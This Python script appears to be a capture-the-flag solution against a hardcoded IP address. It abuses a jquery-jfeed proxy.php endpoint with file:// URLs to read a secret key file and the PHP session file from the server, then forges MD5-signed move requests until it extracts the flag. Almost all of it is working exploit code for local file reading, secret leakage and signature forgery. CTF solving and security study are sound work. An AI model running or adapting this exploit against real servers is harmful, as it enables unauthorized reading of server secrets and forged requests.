import requests
import re
import hashlib
import sys


TARGET_HOST = "http://124.197.22.141:7878"
PROXY_ENDPOINT = "/javascript/jquery-jfeed/proxy.php"

s = requests.Session()

def log(msg):
    print(f"[*] {msg}")

def get_file_via_lfi(filepath):
    url = f"{TARGET_HOST}{PROXY_ENDPOINT}"
    params = {'url': f'file://{filepath}'}
    try:
        r = s.get(url, params=params, timeout=5)
        return r.text
    except Exception as e:
        log(f"{e}")
        return None

def solve():
    
    log("SEND respawn request to create new map...")
    resp = s.get(f"{TARGET_HOST}/index.php?act=respawn")
    
    phpsessid = s.cookies.get('PHPSESSID')
    if not phpsessid:
        log("Error: Could not retrieve PHPSESSID.")
        return
    log(f"Current Session ID : {phpsessid}")

    # READING SECRET_KEY
    log("Reading file /var/www/secret_key.txt...")
    secret_key_content = get_file_via_lfi("/var/www/secret_key.txt")
    
    if not secret_key_content or "failed" in secret_key_content:
        log("An error occurred while reading secret_key.txt.")
        
        return

    SECRET_KEY = secret_key_content.strip()
    log(f"LEAKED SECRET_KEY: {SECRET_KEY}")

 
    sess_path = f"/tmp/sess_{phpsessid}"
    log(f"READING file session: {sess_path}...")
    
    sess_data = get_file_via_lfi(sess_path)
    if not sess_data:
        log("Error reading session file.")
        return
    
    
    matches = re.findall(r'i:(\d+);i:([01]);', sess_data)
    
    if len(matches) < 40:
        log("Error: Could not find enough path data in session file.")
        log(f"Data raw: {sess_data[:200]}...") 
        return

   
    path_map = {int(k): int(v) for k, v in matches}
    SORTED_PATH = [path_map[i] for i in range(40)]
    
    log(f"MAP: {SORTED_PATH}")
    
    
    log("SENDING REQUEST...")
    
    for step, side in enumerate(SORTED_PATH):
        
        raw_string = f"{SECRET_KEY}|{step}|{side}"
        signature = hashlib.md5(raw_string.encode()).hexdigest()
        
        params = {
            'act': 'move',
            'step': step,
            'side': side,
            'h': signature
        }
        
        # move
        r = s.get(f"{TARGET_HOST}/index.php", params=params)
        
        if "You Win" in r.text:
            flag = r.text.split('|')[-1]
            print("\n" + "#"*50)
            print(f"FLAG FOUND! FLAG: {flag}")
            return
        
        if "ok" not in r.text:
            log(f"FAILED at {step} (Side {side}). Server res: {r.text}")
            return
            
        sys.stdout.write(f"\rStep {step+1}/40 OK...")
        sys.stdout.flush()

if __name__ == "__main__":
    solve()